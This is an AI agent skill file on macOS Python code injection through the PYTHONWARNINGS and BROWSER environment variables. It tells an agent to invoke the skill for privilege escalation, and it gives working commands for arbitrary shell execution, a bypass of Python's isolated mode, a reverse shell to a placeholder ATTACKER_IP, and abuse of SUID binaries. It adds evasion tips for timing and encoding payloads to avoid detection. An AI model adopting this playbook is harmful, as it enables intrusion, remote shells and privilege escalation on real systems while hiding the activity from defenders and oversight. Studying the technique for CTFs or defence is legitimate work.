---
name: macos-python-env-injection
description: macOS Python application injection via PYTHONWARNINGS and BROWSER environment variables. Use this skill whenever you need to achieve code execution through Python on macOS, especially when you have write access to environment variables or can influence how Python is invoked. Trigger this for privilege escalation scenarios, CTF challenges involving Python, or when you need to bypass Python's isolated mode (-I flag). This technique works by exploiting how Python processes warning configurations and browser handlers.
---

# macOS Python Applications Injection

This skill covers exploiting Python environment variables on macOS to achieve arbitrary code execution. The technique leverages two environment variables: `PYTHONWARNINGS` and `BROWSER`.

## When to Use This Skill

Use this skill when:
- You have a macOS target running Python applications
- You can set or influence environment variables before Python execution
- You need to achieve code execution or privilege escalation
- You're working on CTF challenges involving Python exploitation
- You need to bypass Python's isolated mode (`-I` flag)
- You have write access to a Python script that will be executed

## Core Technique

Python processes certain environment variables before executing scripts, which can be exploited to inject arbitrary code:

### 1. PYTHONWARNINGS Variable

The `PYTHONWARNINGS` variable controls how Python handles warnings. It can be crafted to trigger code execution through the `antigravity` module.

### 2. BROWSER Variable

The `BROWSER` variable tells Python which browser to use for certain operations. It can be crafted to execute shell commands.

## Exploitation Methods

### Method 1: Basic PYTHONWARNINGS + BROWSER Injection

```bash
# Generate a target Python script
echo "print('hi')" > /tmp/script.py

# Execute arbitrary code via environment variables
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
```

**How it works:**
- `PYTHONWARNINGS="all:0:antigravity.x:0:0"` triggers the antigravity module
- `BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s"` executes the shell command
- The `#%s` is a format string that Python uses for the browser URL

### Method 2: Bypassing Isolated Mode (-I Flag)

When Python is run with `-I` (isolated mode), some environment variables are ignored. You can bypass this by injecting `-W` before the script:

```bash
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

**How it works:**
- The `-W` flag is processed before `-I` takes full effect
- This allows the warning configuration to still trigger
- The BROWSER variable still executes the payload

## Practical Examples

### Example 1: Reverse Shell

```bash
# Create a reverse shell payload
BROWSER="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' #%s"
PYTHONWARNINGS="all:0:antigravity.x:0:0"

# Execute the target script
python3 /path/to/target.py
```

### Example 2: File Creation/Modification

```bash
# Create a file as the Python process user
BROWSER="/bin/sh -c 'echo malicious > /tmp/pwned' #%s"
PYTHONWARNINGS="all:0:antigravity.x:0:0"
python3 /path/to/script.py
```

### Example 3: SUID Binary Exploitation

If you find a SUID Python binary or script:

```bash
# Set environment variables before execution
export PYTHONWARNINGS="all:0:antigravity.x:0:0"
export BROWSER="/bin/sh -c 'id > /tmp/root_access' #%s"

# Run the SUID binary
/path/to/suid_python_binary
```

## Detection and Evasion

### Detection Signs
- Unexpected files created in `/tmp/` or other writable directories
- Strange process spawning from Python
- Network connections from Python processes

### Evasion Tips
- Use legitimate-looking file paths in your payload
- Time your execution to blend with normal activity
- Consider using encoded payloads to avoid detection

## Limitations

- Requires ability to set environment variables before Python execution
- May not work if the Python process runs with restricted permissions
- Some hardened systems may sanitize environment variables
- The `-I` flag bypass requires specific flag ordering

## Related Techniques

- Python shebang injection
- Python path manipulation
- Sitecustomize.py exploitation
- PYTHONSTARTUP variable abuse

## References

- [HackTricks - macOS Python Applications Injection](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/macos-python-applications-injection)
- Python Environment Variables Documentation
- CTF writeups involving Python exploitation
